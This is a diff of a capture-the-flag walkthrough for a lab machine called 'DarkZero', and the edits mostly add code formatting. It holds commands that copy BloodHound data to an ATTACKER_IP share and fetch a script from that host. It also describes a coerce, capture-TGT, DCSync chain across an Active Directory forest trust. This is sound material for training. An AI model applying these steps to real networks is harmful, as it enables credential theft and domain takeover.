@@ -358,11 +358,11 @@ PS> net use \\<ATTACKER_IP>\share /user:kali kali
 PS> copy 20260805004307_BloodHound.zip \\<ATTACKER_IP>\share
 ```
 
-There is a bidirectional cross-forest trust between darkzero.htb and darkzero.ext, which allows for some interesting attacks to be performed. Looking through BloodHound's general information tab shows that if TGT delegation is enabled, we could use DC01's ticket to escalate privileges.
+There is a bidirectional cross-forest trust between `darkzero.htb` and `darkzero.ext`, which allows for some interesting attacks to be performed. Looking through BloodHound's general information tab shows that if TGT delegation is enabled, we could use DC01's ticket to escalate privileges.
 
 ![](/assets/img/2026-08-04-DarkZero/18.png)
 
-This option is disabled by default, but uploading a tool like [Enum-ADTrusts.ps1](https://github.com/sse-secure-systems/Active-Directory-Spotlights/blob/master/AD-Trusts/Enum-ADTrusts.ps1) gives us more insight and specifically shows us the target flag - CROSS_ORGANIZATION_ENABLE_TGT_DELEGATION .
+This option is disabled by default, but uploading a tool like [Enum-ADTrusts.ps1](https://github.com/sse-secure-systems/Active-Directory-Spotlights/blob/master/AD-Trusts/Enum-ADTrusts.ps1) gives us more insight and specifically shows us the target flag - `CROSS_ORGANIZATION_ENABLE_TGT_DELEGATION`.
 
 ```
 PS> curl http://<ATTACKER_IP>/Enum-ADTrusts.ps1 -o Enum-ADTrusts.ps1
@@ -374,9 +374,9 @@ PS> . .\Enum-ADTrusts.ps1
 
 This confirms that TGT delegation is enabled between these two domains and gives us the green light for our next attack. 
 
-If we've already compromised a host configured for unconstrained delegation in our current domain, we can weaponize a cross-trust relationship by coercing the remote domain's DC to authenticate back to us - tools like SpoolSample, PetitPotam, or any RPC-based coercion primitive work perfectly here since DCs run the vulnerable services by default. The moment that coerced authentication hits our unconstrained delegation host, Windows dutifully deposits the remote DC's TGT into LSASS memory on our machine, since that's the entire mechanical point of unconstrained delegation - and we can rip it out immediately with Rubeus dump or Mimikatz's sekurlsa::tickets. 
+If we've already compromised a host configured for unconstrained delegation in our current domain, we can weaponize a cross-trust relationship by coercing the remote domain's DC to authenticate back to us - tools like SpoolSample, PetitPotam, or any RPC-based coercion primitive work perfectly here since DCs run the vulnerable services by default. The moment that coerced authentication hits our unconstrained delegation host, Windows dutifully deposits the remote DC's TGT into LSASS memory on our machine, since that's the entire mechanical point of unconstrained delegation - and we can rip it out immediately with Rubeus' dump or Mimikatz's `sekurlsa::tickets`. 
 
-Because the TGT is marked forwardable (inter-domain machine account tickets across a trust typically are), we can inject it directly into our session and operate as that DC principal against its own domain. From there we request a ticket against the remote DC's DRSUAPI interface - the replication service - and since we're presenting a ticket for a domain controller account, we have the DS-Replication-Get-Changes-All rights needed to trigger a full DCSync, pulling every NTLM hash and Kerberos key in the remote domain without ever touching LSASS on the target. The whole chain - coerce, capture, inject, replicate - can go from zero to krbtgt hash of a fully separate AD domain in minutes, which is why unconstrained delegation hosts in environments with external trusts are some of the highest-value pivot points I look for during an engagement.
+Because the TGT is marked forwardable (inter-domain machine account tickets across a trust typically are), we can inject it directly into our session and operate as that DC principal against its own domain. From there we request a ticket against the remote DC's `DRSUAPI` interface - the replication service - and since we're presenting a ticket for a domain controller account, we have the `DS-Replication-Get-Changes-All` rights needed to trigger a full DCSync, pulling every NTLM hash and Kerberos key in the remote domain without ever touching LSASS on the target. The whole chain - coerce, capture, inject, replicate - can go from zero to krbtgt hash of a fully separate AD domain in minutes, which is why unconstrained delegation hosts in environments with external trusts are some of the highest-value pivot points I look for during an engagement.
 
 ### Extracting DC01$ Ticket 
 To start this attack chain out, we'll need to coerce DC01's machine account into authenticating to DC02 so that we can extract its TGT from memory. This can be done with specialized tools like PetitPotam and more, but we can just reuse a previous step and execute xp_dirtree on the DC01 side of the MSSQL server, having it access a share on DC02's filesystem. We'll also need to upload a [Rubeus](https://github.com/ghostpack/rubeus) binary in order to grab that ticket once authentication happens.
